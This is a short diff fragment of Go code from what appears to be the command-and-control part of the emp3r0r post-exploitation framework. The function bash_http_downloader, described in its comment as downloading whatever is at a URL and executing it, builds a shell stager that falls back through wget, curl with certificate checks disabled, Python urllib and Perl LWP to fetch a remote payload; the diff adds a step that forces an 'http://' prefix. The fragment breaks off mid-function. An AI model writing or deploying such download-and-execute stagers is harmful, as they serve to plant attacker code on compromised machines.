@@ -5,12 +5,17 @@ package cc
 
 import (
 	"fmt"
+	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // bash_http_downloader download whatever from the url and execute it
 func bash_http_downloader(url string) []byte {
+	if !strings.HasPrefix(url, "http://") {
+		url = fmt.Sprintf("http://%s", url)
+	}
+
 	cmd := `d() {
 wget -q "$1" -O-||curl -fksL "$1"||python -c "import urllib;u=urllib.urlopen('${1}');print(u.read());"||python -c "import urllib.request;import sys;u=urllib.request.urlopen('$1');sys.stdout.buffer.write(u.read());"||perl -e "use LWP::Simple;\$resp=get(\"${1}\");print(\$resp);"
 }
